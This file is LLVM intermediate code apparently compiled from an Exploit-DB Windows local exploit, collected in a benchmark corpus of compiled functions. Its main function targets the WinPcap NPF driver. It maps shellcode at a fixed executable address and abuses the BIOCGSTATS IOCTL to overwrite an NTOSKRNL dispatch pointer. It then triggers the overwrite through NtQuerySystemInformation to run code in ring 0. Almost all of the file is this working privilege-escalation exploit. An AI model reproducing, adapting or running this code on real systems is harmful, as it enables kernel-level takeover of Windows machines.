; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_4165.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_4165.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [10 x i8] c"NTDLL.DLL\00", align 1
@.str.1 = private unnamed_addr constant [25 x i8] c"NtQuerySystemInformation\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"Searching for a valid Interface ...\0A\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"NPF Device name generated! : %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [35 x i8] c"Cannot found any valid Interface!\0A\00", align 1
@MEM_COMMIT = common dso_local global i32 0, align 4
@MEM_RESERVE = common dso_local global i32 0, align 4
@PAGE_EXECUTE_READWRITE = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [24 x i8] c"Memory allocated at %p\0A\00", align 1
@ShellCode = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [29 x i8] c"Memory mapping filled! ... \0A\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"Cannot allocate memory!\0A\00", align 1
@GENERIC_READ = common dso_local global i32 0, align 4
@GENERIC_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [31 x i8] c"Device %s succesfully opened!\0A\00", align 1
@g_PatchAddress = common dso_local global i8* null, align 8
@IOCTL_BIOCGSTATS = common dso_local global i32 0, align 4
@OUT_SIZE = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [43 x i8] c"First time reading ... bytes returned %#x\0A\00", align 1
@.str.10 = private unnamed_addr constant [20 x i8] c"OutBuffer[i] = %#x\0A\00", align 1
@.str.11 = private unnamed_addr constant [63 x i8] c"Launching exploit ... \0AOverwritting NTOSKRNL switch at -> %#p\0A\00", align 1
@.str.12 = private unnamed_addr constant [25 x i8] c"We are back from ring0!\0A\00", align 1
@.str.13 = private unnamed_addr constant [30 x i8] c"Error: Cannot open device %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4 x i32], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i32 (i32, i32*, i32, i32*)*, align 8
  %13 = alloca [100 x i8], align 16
  %14 = alloca [36 x i32], align 16
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = call i32 @GetModuleHandleA(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0))
  %17 = call i64 @GetProcAddress(i32 %16, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0))
  %18 = inttoptr i64 %17 to i32 (i32, i32*, i32, i32*)*
  store i32 (i32, i32*, i32, i32*)* %18, i32 (i32, i32*, i32, i32*)** %12, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0))
  %20 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %21 = call i64 @GetNpfDevice(i8* %20)
  %22 = icmp ne i64 %21, 0
  br i1 %22, label %23, label %26

23:                                               ; preds = %2
  %24 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0), i8* %24)
  br label %28

26:                                               ; preds = %2
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %122

28:                                               ; preds = %23
  %29 = load i32, i32* @MEM_COMMIT, align 4
  %30 = load i32, i32* @MEM_RESERVE, align 4
  %31 = or i32 %29, %30
  %32 = load i32, i32* @PAGE_EXECUTE_READWRITE, align 4
  %33 = call i8* @VirtualAlloc(i8* inttoptr (i64 5701632 to i8*), i32 131072, i32 %31, i32 %32)
  store i8* %33, i8** %11, align 8
  %34 = icmp ne i8* %33, null
  br i1 %34, label %35, label %54

35:                                               ; preds = %28
  %36 = load i8*, i8** %11, align 8
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0), i8* %36)
  store i32 0, i32* %15, align 4
  br label %38

38:                                               ; preds = %49, %35
  %39 = load i32, i32* %15, align 4
  %40 = sext i32 %39 to i64
  %41 = icmp ult i64 %40, 16384
  br i1 %41, label %42, label %52

42:                                               ; preds = %38
  %43 = load i8*, i8** @ShellCode, align 8
  %44 = load i8*, i8** %11, align 8
  %45 = bitcast i8* %44 to i8**
  %46 = load i32, i32* %15, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8*, i8** %45, i64 %47
  store i8* %43, i8** %48, align 8
  br label %49

49:                                               ; preds = %42
  %50 = load i32, i32* %15, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %15, align 4
  br label %38

52:                                               ; preds = %38
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.6, i64 0, i64 0))
  br label %56

54:                                               ; preds = %28
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %122

56:                                               ; preds = %52
  %57 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %58 = load i32, i32* @GENERIC_READ, align 4
  %59 = load i32, i32* @GENERIC_WRITE, align 4
  %60 = or i32 %58, %59
  %61 = load i32, i32* @OPEN_EXISTING, align 4
  %62 = call i32 @CreateFileA(i8* %57, i32 %60, i32 0, i32 0, i32 %61, i32 0, i32* null)
  store i32 %62, i32* %6, align 4
  %63 = load i32, i32* @INVALID_HANDLE_VALUE, align 4
  %64 = icmp ne i32 %62, %63
  br i1 %64, label %65, label %119

65:                                               ; preds = %56
  %66 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.8, i64 0, i64 0), i8* %66)
  %68 = call i8* (...) @GetNtosBase()
  store i8* %68, i8** %7, align 8
  %69 = icmp ne i8* %68, null
  br i1 %69, label %70, label %118

70:                                               ; preds = %65
  %71 = call i32 (...) @GetNtosDelta()
  store i32 %71, i32* %9, align 4
  %72 = icmp ne i32 %71, 0
  br i1 %72, label %73, label %118

73:                                               ; preds = %70
  %74 = load i8*, i8** %7, align 8
  %75 = ptrtoint i8* %74 to i32
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %75, %76
  %78 = sext i32 %77 to i64
  %79 = inttoptr i64 %78 to i8*
  store i8* %79, i8** @g_PatchAddress, align 8
  %80 = load i32, i32* %6, align 4
  %81 = load i32, i32* @IOCTL_BIOCGSTATS, align 4
  %82 = getelementptr inbounds [4 x i32], [4 x i32]* %10, i64 0, i64 0
  %83 = bitcast i32* %82 to i8*
  %84 = load i32, i32* @OUT_SIZE, align 4
  %85 = call i64 @DeviceIoControl(i32 %80, i32 %81, i8* null, i32 0, i8* %83, i32 %84, i32* %8, i32* null)
  %86 = icmp ne i64 %85, 0
  br i1 %86, label %87, label %103

87:                                               ; preds = %73
  %88 = load i32, i32* %8, align 4
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.9, i64 0, i64 0), i32 %88)
  store i32 0, i32* %15, align 4
  br label %90

90:                                               ; preds = %99, %87
  %91 = load i32, i32* %15, align 4
  %92 = icmp slt i32 %91, 4
  br i1 %92, label %93, label %102

93:                                               ; preds = %90
  %94 = load i32, i32* %15, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [4 x i32], [4 x i32]* %10, i64 0, i64 %95
  %97 = load i32, i32* %96, align 4
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.10, i64 0, i64 0), i32 %97)
  br label %99

99:                                               ; preds = %93
  %100 = load i32, i32* %15, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %15, align 4
  br label %90

102:                                              ; preds = %90
  br label %103

103:                                              ; preds = %102, %73
  %104 = load i8*, i8** @g_PatchAddress, align 8
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.11, i64 0, i64 0), i8* %104)
  %106 = load i32, i32* %6, align 4
  %107 = load i32, i32* @IOCTL_BIOCGSTATS, align 4
  %108 = load i8*, i8** @g_PatchAddress, align 8
  %109 = load i32, i32* @OUT_SIZE, align 4
  %110 = call i64 @DeviceIoControl(i32 %106, i32 %107, i8* null, i32 0, i8* %108, i32 %109, i32* %8, i32* null)
  %111 = icmp ne i64 %110, 0
  br i1 %111, label %112, label %117

112:                                              ; preds = %103
  %113 = load i32 (i32, i32*, i32, i32*)*, i32 (i32, i32*, i32, i32*)** %12, align 8
  %114 = getelementptr inbounds [36 x i32], [36 x i32]* %14, i64 0, i64 0
  %115 = call i32 %113(i32 21, i32* %114, i32 144, i32* null)
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i64 0, i64 0))
  br label %117

117:                                              ; preds = %112, %103
  br label %118

118:                                              ; preds = %117, %70, %65
  br label %122

119:                                              ; preds = %56
  %120 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %121 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.13, i64 0, i64 0), i8* %120)
  br label %122

122:                                              ; preds = %26, %54, %119, %118
  %123 = load i32, i32* %3, align 4
  ret i32 %123
}

declare dso_local i64 @GetProcAddress(i32, i8*) #1

declare dso_local i32 @GetModuleHandleA(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @GetNpfDevice(i8*) #1

declare dso_local i8* @VirtualAlloc(i8*, i32, i32, i32) #1

declare dso_local i32 @CreateFileA(i8*, i32, i32, i32, i32, i32, i32*) #1

declare dso_local i8* @GetNtosBase(...) #1

declare dso_local i32 @GetNtosDelta(...) #1

declare dso_local i64 @DeviceIoControl(i32, i32, i8*, i32, i8*, i32, i32*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
